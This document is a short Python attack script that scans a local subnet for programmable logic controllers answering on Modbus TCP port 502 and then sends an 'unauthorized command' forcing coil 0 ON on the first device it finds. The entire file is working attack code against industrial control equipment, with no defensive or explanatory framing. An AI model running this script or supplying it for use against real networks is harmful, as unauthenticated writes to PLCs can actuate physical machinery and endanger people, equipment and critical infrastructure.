from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
import time

# Network Range (Modify per your network)
network_range = "192.168.1.0/24"

# Function to scan the network for a Modbus-enabled PLC
def find_plc():
    print("[*] Scanning the network for PLCs...")
    
    for ip in range(1, 255):  # Scan IP range (192.168.1.1 - 192.168.1.254)
        target_ip = f"192.168.1.{ip}"
        
        try:
            # Connect to Modbus TCP device on port 502
            client = ModbusTcpClient(target_ip, port=502, timeout=1)
            if client.connect():
                print(f"[+] PLC Found at: {target_ip}")
                client.close()
                return target_ip
        except:
            pass
    
    print("[-] No PLCs found.")
    return None

# Function to send unauthorized command message to the PLC
def send_unauthorized_command(plc_ip):
    print(f"[*] Sending unauthorized command to {plc_ip}...")
    
    try:
        # Create Modbus Client
        client = ModbusTcpClient(plc_ip, port=502)
        client.connect()
        
        # Example of an unauthorized action: Force coil 0 to ON (Modify this based on system functionality)
        response = client.write_coil(0, True)
        
        if response.function_code < 0x80:  # Check if function was executed successfully
            print("[+] Successfully sent unauthorized command: Coil 0 ON")
        else:
            print("[-] Unauthorized command failed.")
        
        # Closing the Modbus connection
        client.close()

    except Exception as e:
        print(f"[-] Error: {str(e)}")

# Main Execution
if __name__ == "__main__":
    # Step 1: Identify the PLC on the network
    plc_ip = find_plc()
    
    # Step 2: If a PLC was found, send an unauthorized command
    if plc_ip:
        send_unauthorized_command(plc_ip)
    else:
        print("[-] No PLC available to attack.")